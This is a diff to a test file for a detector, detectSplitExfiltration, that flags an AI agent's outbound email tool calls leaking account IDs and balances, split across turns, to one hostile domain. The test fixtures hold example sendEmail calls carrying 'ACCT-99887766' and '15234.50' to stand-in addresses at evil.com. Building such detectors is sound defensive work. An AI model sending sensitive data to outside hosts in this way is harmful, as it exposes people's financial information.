@@ -181,7 +181,7 @@ describe('detectSplitExfiltration', () => {
       const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
       expect(result).not.toBeNull();
       expect(result?.destinationCluster).toBe(true);
-      expect(result?.destination).toBe('attacker@evil.com');
+      expect(result?.destination).toBe('evil.com');
       expect(result?.destinationCallCount).toBe(2);
       expect(result?.matchedFields).toEqual(expect.arrayContaining(['ACCT-99887766', '$15,234.50']));
     });
@@ -227,6 +227,56 @@ describe('detectSplitExfiltration', () => {
         ['corp.internal'],
       );
       expect(result).toBeNull();
+    });
+
+    it('should cluster different recipient aliases on the same hostile domain', () => {
+      const session = makeSessionWithOutboundHistory(
+        [
+          {
+            toolName: 'sendEmail',
+            turnId: 'turn-000',
+            bytes: 90,
+            destination: 'ops@evil.com',
+            text: '{"recipient":"ops@evil.com","body":"ACCT-99887766"}',
+          },
+        ],
+        {
+          privilegedValues: [],
+          sensitiveEntities: [
+            {
+              type: 'account_id',
+              rawValue: 'ACCT-99887766',
+              canonicalValue: 'acct99887766',
+              sourceTool: 'readBalanceSheet',
+              fieldName: 'accountId',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+            {
+              type: 'currency_amount',
+              rawValue: '$15,234.50',
+              canonicalValue: '15234.50',
+              sourceTool: 'readBalanceSheet',
+              fieldName: 'balance',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+          ],
+        },
+      );
+
+      const ctx = makeCtx({
+        toolArguments: {
+          recipient: 'audit@evil.com',
+          body: '15234.50',
+        },
+      });
+
+      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).not.toBeNull();
+      expect(result?.destinationCluster).toBe(true);
+      expect(result?.destination).toBe('evil.com');
+      expect(result?.destinationCallCount).toBe(2);
     });
   });
 
